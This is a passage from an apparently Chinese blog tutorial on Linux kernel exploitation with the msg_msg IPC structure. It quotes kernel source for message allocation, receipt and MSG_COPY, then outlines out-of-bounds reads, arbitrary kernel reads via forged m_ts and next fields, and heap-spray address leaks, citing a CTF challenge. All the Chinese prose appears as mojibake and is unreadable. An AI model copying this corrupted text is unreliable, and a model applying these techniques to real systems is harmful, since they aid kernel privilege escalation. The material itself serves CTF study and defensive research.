ä¹‹é—´å½¢æˆå¦‚ä¸‹å•å‘é“¾è¡¨ç»“æ„ï¼š</p><p><img src="https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png" alt="image.png"></p><p>åŒæ ·åœ°ï¼Œå•ä¸ª <code>msg_msgseg</code> çš„å¤§å°æœ€å¤§ä¸ºä¸€ä¸ªé¡µé¢å¤§å°ï¼Œå› æ­¤è¶…å‡ºè¿™ä¸ªèŒƒå›´çš„æ¶ˆæ¯å†…æ ¸ä¼šé¢å¤–è¡¥å……ä¸Šæ›´å¤šçš„ <code>msg_msgseg</code> ç»“æ„ä½“</p><h3 id="åˆ†é…ï¼ˆGFP-KERNEL-ACCOUNTï¼‰ï¼šmsgsnd-ç³»ç»Ÿè°ƒç”¨"><a href="#åˆ†é…ï¼ˆGFP-KERNEL-ACCOUNTï¼‰ï¼šmsgsnd-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="åˆ†é…ï¼ˆGFP_KERNEL_ACCOUNTï¼‰ï¼šmsgsnd ç³»ç»Ÿè°ƒç”¨"></a>åˆ†é…ï¼ˆGFP_KERNEL_ACCOUNTï¼‰ï¼šmsgsnd ç³»ç»Ÿè°ƒç”¨</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥æ·±å…¥ msg_msg çš„å†…éƒ¨ç»“æ„ï¼Œé˜…è¯» msgsnd æºç å¯çŸ¥ï¼Œå½“æˆ‘ä»¬åœ¨æ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€ä¸€ä¸ª message æ—¶ï¼Œå…¶é¦–å…ˆä¼šè°ƒç”¨ <code>load_msg</code> å°†è¯¥ message æ‹·è´åˆ°å†…æ ¸ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msgsnd</span><span class="params">(<span class="type">int</span> msqid, <span class="type">long</span> mtype, <span class="type">void</span> __user *mtext,</span></span><br><span class="line"><span class="params"><span class="type">size_t</span> msgsz, <span class="type">int</span> msgflg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="type">long</span>) msgsz &lt; <span class="number">0</span> || msqid &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (mtype &lt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">msg = load_msg(mtext, msgsz);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>è€Œ <code>load_msg()</code> æœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>alloc_msg()</code> åˆ†é…æ‰€éœ€çš„ç©ºé—´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> msg_msg *<span class="title function_">load_msg</span><span class="params">(<span class="type">const</span> <span class="type">void</span> __user *src, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"><span class="type">int</span> err = -EFAULT;</span><br><span class="line"><span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">msg = alloc_msg(len);</span><br></pre></td></tr></table></figure><p>é˜…è¯» <code>alloc_msg()</code> æºç å¯ä»¥å‘ç°ï¼Œå…¶ä»¥ msg_msg ç»“æ„ä½“ä¸ºæ ¸å¿ƒç”Ÿæˆå¦‚ä¸‹ç»“æ„ï¼š</p><ul><li>å¯¹äºå¤§å°åœ¨ã€ä¸€ä¸ªé¡µé¢å†å‡æ‰ä½œä¸º header çš„ msg_msg çš„ sizeã€‘èŒƒå›´å†…çš„æ•°æ®è€Œè¨€ï¼Œå†…æ ¸ä»…ä¼šåˆ†é…ä¸€ä¸ª size + header size å¤§å°çš„ objectï¼ˆé€šè¿‡ kmallocï¼‰ï¼Œå…¶å‰ 0x30 å¤§å°çš„éƒ¨åˆ†å­˜æ”¾ msg_msg è¿™ä¸€ headerï¼Œå‰©ä½™éƒ¨åˆ†ç”¨ä»¥å­˜æ”¾ç”¨æˆ·æ•°æ®</li><li>å¯¹äºå¤§å°è¶…å‡ºã€ä¸€ä¸ªé¡µé¢å†å‡æ‰ä½œä¸º header çš„ msg_msg çš„ sizeã€‘èŒƒå›´çš„æ•°æ®è€Œè¨€ï¼Œå…¶ä¼šé¢å¤–ç”Ÿæˆ <code>msg_msgseg</code> ç»“æ„ä½“æ¥å­˜æ”¾ç”¨æˆ·æ•°æ®ï¼Œé€šè¿‡ kmalloc åˆ†é…ï¼Œå¤§å°ä¸ºå‰©ä½™æœªæ‹·è´çš„ç”¨æˆ·æ•°æ®å¤§å°åŠ ä¸Š next æŒ‡é’ˆï¼›è¯¥ç»“æ„ä½“ä¸ msg_msg çš„ next æˆå‘˜å½¢æˆä¸€ä¸ª<strong>å•å‘é“¾è¡¨</strong>ï¼Œå…¶å‰ 8 å­—èŠ‚å­˜æ”¾æŒ‡å‘ä¸‹ä¸€ä¸ª msg_msgseg çš„æŒ‡é’ˆï¼Œè‹¥æ— åˆ™ä¸º NULL</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> msg_msg *<span class="title function_">alloc_msg</span><span class="params">(<span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line"><span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">alen = min(len, DATALEN_MSG);</span><br><span class="line">msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">len -= alen;</span><br><span class="line">pseg = &amp;msg-&gt;next;</span><br><span class="line"><span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">cond_resched();</span><br><span class="line"></span><br><span class="line">alen = min(len, DATALEN_SEG);</span><br><span class="line">seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> out_err;</span><br><span class="line">*pseg = seg;</span><br><span class="line">seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">pseg = &amp;seg-&gt;next;</span><br><span class="line">len -= alen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">free_msg(msg);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é‡Šæ”¾ï¼šmsgrcv-ç³»ç»Ÿè°ƒç”¨"><a href="#é‡Šæ”¾ï¼šmsgrcv-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="é‡Šæ”¾ï¼šmsgrcv ç³»ç»Ÿè°ƒç”¨"></a>é‡Šæ”¾ï¼šmsgrcv ç³»ç»Ÿè°ƒç”¨</h3><p>IPCï¼Œæœ‰â€œå‘â€è‡ªç„¶ä¼´éšç€æœ‰â€œæ”¶â€ï¼Œæˆ‘ä»¬å‘é€æ¶ˆæ¯æ—¶è¯¥ç»“æ„ä½“åœ¨å†…æ ¸ä¸­è¢«åˆ›å»ºï¼Œç›¸åº”åœ°åœ¨æˆ‘ä»¬æ¥æ”¶æ¶ˆæ¯æ—¶è¯¥ç»“æ„ä½“å°†è¢«ä»å†…æ ¸ä¸­é‡Šæ”¾ï¼Œé€šè¿‡ msgrcv ç³»ç»Ÿè°ƒç”¨æˆ‘ä»¬å¯ä»¥ä»æŒ‡å®šçš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ¥æ”¶æŒ‡å®šå¤§å°çš„æ¶ˆæ¯ï¼Œå†…æ ¸é¦–å…ˆä¼šè°ƒç”¨ <code>list_del()</code> å°†å…¶ä» <code>msg_queue</code> çš„åŒå‘é“¾è¡¨ä¸Š unlinkï¼Œä¹‹åå†è°ƒç”¨ <code>free_msg()</code> é‡Šæ”¾ <code>msg_msg</code> å•å‘é“¾è¡¨ä¸Šçš„æ‰€æœ‰æ¶ˆæ¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msgrcv</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> __user *buf, <span class="type">size_t</span> bufsz, <span class="type">long</span> msgtyp, <span class="type">int</span> msgflg,</span></span><br><span class="line"><span class="params">       <span class="type">long</span> (*msg_handler)(<span class="type">void</span> __user *, <span class="keyword">struct</span> msg_msg *, <span class="type">size_t</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    list_del(&amp;msg-&gt;m_list);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">out_unlock0:</span><br><span class="line">ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">free_copy(copy);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">free_msg(msg);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è¯»å–ï¼šmsgrcv-ç³»ç»Ÿè°ƒç”¨"><a href="#è¯»å–ï¼šmsgrcv-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="è¯»å–ï¼šmsgrcv ç³»ç»Ÿè°ƒç”¨"></a>è¯»å–ï¼šmsgrcv ç³»ç»Ÿè°ƒç”¨</h3><p>IPCï¼Œæœ‰â€œå‘â€è‡ªç„¶ä¼´éšç€æœ‰â€œæ”¶â€ï¼Œæˆ‘ä»¬å‘é€æ¶ˆæ¯æ—¶è¯¥ç»“æ„ä½“åœ¨å†…æ ¸ä¸­è¢«åˆ›å»ºï¼Œç›¸åº”åœ°ï¼Œåœ¨æˆ‘ä»¬æ¥æ”¶æ¶ˆæ¯æ—¶ msg_msg é“¾ä¸Šçš„å¯¹è±¡ä¸Šçš„å†…å®¹ä¼šè¢«æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼Œå…¶é€šè¿‡è°ƒç”¨ <code>msg_handler()</code> å‡½æ•°æŒ‡é’ˆå®Œæˆæ‹·è´ï¼Œå¯¹äº msgrcv ç³»ç»Ÿè°ƒç”¨è€Œè¨€ï¼Œç”±å¦‚ä¸‹è°ƒç”¨é“¾ä¼ å…¥è¯¥æŒ‡é’ˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_msgrcv()</span><br><span class="line">ksys_msgrcv()</span><br><span class="line">do_msgrcv()</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆè°ƒç”¨çš„æ˜¯ <code>do_msg_fill()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msg_fill</span><span class="params">(<span class="type">void</span> __user *dest, <span class="keyword">struct</span> msg_msg *msg, <span class="type">size_t</span> bufsz)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span> __<span class="title">user</span> *<span class="title">msgp</span> =</span> dest;</span><br><span class="line"><span class="type">size_t</span> msgsz;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (put_user(msg-&gt;m_type, &amp;msgp-&gt;mtype))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">msgsz = (bufsz &gt; msg-&gt;m_ts) ? msg-&gt;m_ts : bufsz;</span><br><span class="line"><span class="keyword">if</span> (store_msg(msgp-&gt;mtext, msg, msgsz))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">return</span> msgsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¯¥å‡½æ•°ä¸­æœ€ç»ˆè°ƒç”¨ <code>store_msg()</code> å®Œæˆæ¶ˆæ¯å‘ç”¨æˆ·ç©ºé—´çš„æ‹·è´ï¼Œ<strong>æ‹·è´å¾ªç¯çš„ç»ˆæ­¢æ¡ä»¶æ˜¯å•å‘é“¾è¡¨æœ«å°¾çš„ NULL æŒ‡é’ˆ</strong>ï¼Œæ‹·è´æ•°æ®çš„<strong>é•¿åº¦</strong>ä¸»è¦ä¾èµ–çš„æ˜¯ <strong>msg_msg çš„ m_ts æˆå‘˜</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">store_msg</span><span class="params">(<span class="type">void</span> __user *dest, <span class="keyword">struct</span> msg_msg *msg, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> alen;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">alen = min(len, DATALEN_MSG);</span><br><span class="line"><span class="keyword">if</span> (copy_to_user(dest, msg + <span class="number">1</span>, alen))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">len -= alen;</span><br><span class="line">dest = (<span class="type">char</span> __user *)dest + alen;</span><br><span class="line">alen = min(len, DATALEN_SEG);</span><br><span class="line"><span class="keyword">if</span> (copy_to_user(dest, seg + <span class="number">1</span>, alen))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="MSG-COPYï¼šè¯»å–ä½†ä¸é‡Šæ”¾"><a href="#MSG-COPYï¼šè¯»å–ä½†ä¸é‡Šæ”¾" class="headerlink" title="MSG_COPYï¼šè¯»å–ä½†ä¸é‡Šæ”¾"></a>MSG_COPYï¼šè¯»å–ä½†ä¸é‡Šæ”¾</h4><p>å½“æˆ‘ä»¬åœ¨è°ƒç”¨ msgrcv æ¥æ”¶æ¶ˆæ¯æ—¶ï¼Œç›¸åº”çš„ msg_msg é“¾è¡¨ä¾¿ä¼šè¢«é‡Šæ”¾ï¼Œä½†é˜…è¯»æºç æˆ‘ä»¬ä¼šå‘ç°ï¼Œå½“æˆ‘ä»¬åœ¨è°ƒç”¨ msgrcv æ—¶è‹¥è®¾ç½®äº† <code>MSG_COPY</code> æ ‡å¿—ä½ï¼Œåˆ™<strong>å†…æ ¸ä¼šå°† message æ‹·è´ä¸€ä»½åå†æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼ŒåŸåŒå‘é“¾è¡¨ä¸­çš„ message å¹¶ä¸ä¼šè¢« unlink</strong>ï¼Œä»è€Œæˆ‘ä»¬ä¾¿å¯ä»¥<strong>å¤šæ¬¡é‡å¤åœ°è¯»å–åŒä¸€ä¸ª</strong> <code>msg_msg</code> é“¾æ¡ä¸­æ•°æ®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line"><span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">copy = prepare_copy(buf, <span class="type">min_t</span>(<span class="type">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment"> * not update queue parameters.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">msg = copy_msg(msg, copy);</span><br><span class="line"><span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><h3 id="æ•°æ®æ³„éœ²-3"><a href="#æ•°æ®æ³„éœ²-3" class="headerlink" title="æ•°æ®æ³„éœ²"></a>æ•°æ®æ³„éœ²</h3><h4 id="è¶Šç•Œæ•°æ®è¯»å–"><a href="#è¶Šç•Œæ•°æ®è¯»å–" class="headerlink" title="è¶Šç•Œæ•°æ®è¯»å–"></a>è¶Šç•Œæ•°æ®è¯»å–</h4><p>åœ¨æ‹·è´æ•°æ®æ—¶å¯¹é•¿åº¦çš„åˆ¤æ–­ä¸»è¦ä¾é çš„æ˜¯ <code>msg_msg-&gt;m_ts</code>ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼šè‹¥æ˜¯æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ä¸€ä¸ª msg_msg çš„ headerï¼Œå°†å…¶ m_sz æˆå‘˜æ”¹ä¸ºä¸€ä¸ªè¾ƒå¤§çš„æ•°ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿ<strong>è¶Šç•Œè¯»å–å‡ºæœ€å¤šå°†è¿‘ä¸€å¼ å†…å­˜é¡µå¤§å°çš„æ•°æ®</strong></p><h4 id="ä»»æ„åœ°å€è¯»"><a href="#ä»»æ„åœ°å€è¯»" class="headerlink" title="ä»»æ„åœ°å€è¯»"></a>ä»»æ„åœ°å€è¯»</h4><p>å¯¹äºå¤§äºä¸€å¼ å†…å­˜é¡µçš„æ•°æ®è€Œè¨€å†…æ ¸ä¼šåœ¨ msg_msg çš„åŸºç¡€ä¸Šå†è¡¥å……åŠ ä¸Š msg_msgseg ç»“æ„ä½“ï¼Œå½¢æˆä¸€ä¸ªå•å‘é“¾è¡¨ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼šè‹¥æ˜¯æˆ‘ä»¬èƒ½å¤ŸåŒæ—¶åŠ«æŒ <code>msg_msg-&gt;m_ts</code> ä¸ <code>msg_msg-&gt;next</code>ï¼Œæˆ‘ä»¬<strong>ä¾¿èƒ½å¤Ÿå®Œæˆå†…æ ¸ç©ºé—´ä¸­çš„ä»»æ„åœ°å€è¯»</strong></p><p>ä½†è¿™ä¸ªæ–¹æ³•æœ‰ä¸€ä¸ªç¼ºé™·ï¼Œæ— è®ºæ˜¯ <code>MSG_COPY</code> è¿˜æ˜¯å¸¸è§„çš„æ¥æ”¶æ¶ˆæ¯ï¼Œå…¶æ‹·è´æ¶ˆæ¯çš„è¿‡ç¨‹çš„åˆ¤æ–­ä¸»è¦ä¾æ®è¿˜æ˜¯å•å‘é“¾è¡¨çš„ next æŒ‡é’ˆï¼Œå› æ­¤è‹¥æˆ‘ä»¬éœ€è¦å®Œæˆå¯¹ç‰¹å®šåœ°å€å‘åçš„ä¸€å—åŒºåŸŸçš„è¯»å–ï¼Œ<strong>æˆ‘ä»¬éœ€è¦ä¿è¯è¯¥åœ°å€çš„æ•°æ®ä¸º NULL</strong></p><h4 id="å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ-direct-mapping-areaï¼‰-2"><a href="#å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ-direct-mapping-areaï¼‰-2" class="headerlink" title="*å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ direct mapping areaï¼‰"></a><em>*å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ direct mapping areaï¼‰</em></h4><p>è™½ç„¶æˆ‘ä»¬ä¸èƒ½ç›´æ¥è¯»å–å½“å‰ msg_msg çš„ headerï¼Œä½†æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼šæˆ‘ä»¬å¯ä»¥é€šè¿‡å–·å°„å¤§é‡çš„ msg_msgï¼Œä»è€Œ<strong>åˆ©ç”¨è¶Šç•Œè¯»æ¥è¯»å–å…¶ä»– msg_msg çš„ header</strong>ï¼Œé€šè¿‡å…¶åŒå‘é“¾è¡¨æˆå‘˜æ³„éœ²å‡ºä¸€ä¸ªâ€œå †â€ä¸Šåœ°å€</p><p>é‚£ä¹ˆè¿™ä¸ªâ€œå †â€ä¸Šåœ°å€æŒ‡å‘å“ªå‘¢ï¼Ÿè®©æˆ‘ä»¬å°†ç›®å…‰é‡æ–°æ”¾å› <code>msg_queue</code> ä¸ <code>msg_msg</code> ç»“æ„ä½“ä¹‹é—´çš„å…³ç³»ï¼Œå½“ä¸€ä¸ªæ¶ˆæ¯ä¸Šåªæœ‰ä¸€ä¸ª message æ—¶ï¼Œæˆ‘ä»¬ä¸éš¾çœ‹å‡º msg_msg çš„ prev ä¸ next æŒ‡é’ˆéƒ½æŒ‡å‘ msg_queue çš„ <code>q_messages</code> åŸŸï¼Œå¯¹åº”åœ°ï¼Œ msg_queue-&gt;q_message çš„ prev ä¸ next ä¹ŸåŒæ ·æŒ‡å‘ msg_msg çš„ <code>m_list</code> åŸŸ</p><p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" alt="image.png"></p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥è·å¾—åˆ°å¯¹åº”çš„ <code>msg_queue</code> çš„åœ°å€ï¼Œç›¸åº”åœ°ï¼Œ<strong>æˆ‘ä»¬å¯ä»¥å°† msg_msg çš„ next æŒ‡é’ˆæŒ‡å› msg_queueï¼Œä»è€Œè¯»å‡ºä¸Šé¢çš„æŒ‡å‘ msg_msg çš„æŒ‡é’ˆï¼Œå°†æœªçŸ¥çš„åœ°å€å˜ä¸ºå·²çŸ¥çš„åœ°å€</strong></p><h4 id="åŸºäºå †åœ°å€æ³„éœ²çš„å †ä¸Šè¿ç»­å†…å­˜æœç´¢"><a href="#åŸºäºå †åœ°å€æ³„éœ²çš„å †ä¸Šè¿ç»­å†…å­˜æœç´¢" class="headerlink" title="**åŸºäºå †åœ°å€æ³„éœ²çš„å †ä¸Šè¿ç»­å†…å­˜æœç´¢"></a>**åŸºäºå †åœ°å€æ³„éœ²çš„å †ä¸Šè¿ç»­å†…å­˜æœç´¢</h4><p>åœ¨æˆ‘ä»¬å®Œæˆå¯¹â€œå †â€ä¸Šåœ°å€çš„æ³„éœ²ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ¯ä¸€æ¬¡è¯»å–æ—¶<strong>æŒ‘é€‰å·²çŸ¥æ•°æ®ä¸º NULL çš„åŒºåŸŸä½œä¸º next-&gt;next ä»¥é¿å… kernel panic</strong>ï¼Œä»¥æ­¤è·å¾—<strong>è¿ç»­çš„æœç´¢å†…å­˜çš„èƒ½åŠ›</strong>ï¼Œä¸è¿‡è¿™éœ€è¦æˆ‘ä»¬æ‹¥æœ‰è¶³å¤Ÿæ¬¡æ•°çš„æ›´æ”¹ msg_msg çš„ header çš„èƒ½åŠ›</p><p>ï¼ˆä¾‹é¢˜ï¼š<a href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/">D^3CTF2022 - d3kheap</a>ï¼‰</p><blockquote><p>ä¹‹å‰ä¾‹é¢˜æœ¬æ¥æƒ³é€‰ä¸€ä¸ªä»¥å‰æœ‰çš„ CTF é¢˜æ¥å†™çš„ï¼ˆæ¯”å¦‚è¯´ corCTFï¼‰ï¼Œä½†æ˜¯<strong>ç¬”è€…å¤ªæ‡’äº†</strong>â€¦äºæ˜¯ä¸€ç›´æ‹–åˆ°æœ€è¿‘åˆšå¥½æ‹¿è¿™ä¸ªç»“æ„ä½“å‡ºäº†ä¸€é“ CTF é¢˜ï¼Œæ‰€ä»¥å°±é¡ºä¾¿æŠŠè¿™ä¸ªè¿‡å»å¼€çš„å‘ç»™è¡¥å……ä¸Šâ€¦</p></blockquote><h3 id="ä»»æ„åœ°å€å†™ï¼ˆç»“åˆ-userfaultfd-æˆ–-FUSE-å®Œæˆ-race-condition-writeï¼‰"><a href="#ä»»æ„åœ°å€å†™ï¼ˆç»“åˆ-userfaultfd-æˆ–-FUSE-å®Œæˆ-race-condition-writeï¼‰" class="headerlink" title="ä»»æ„åœ°å€å†™ï¼ˆç»“åˆ userfaultfd 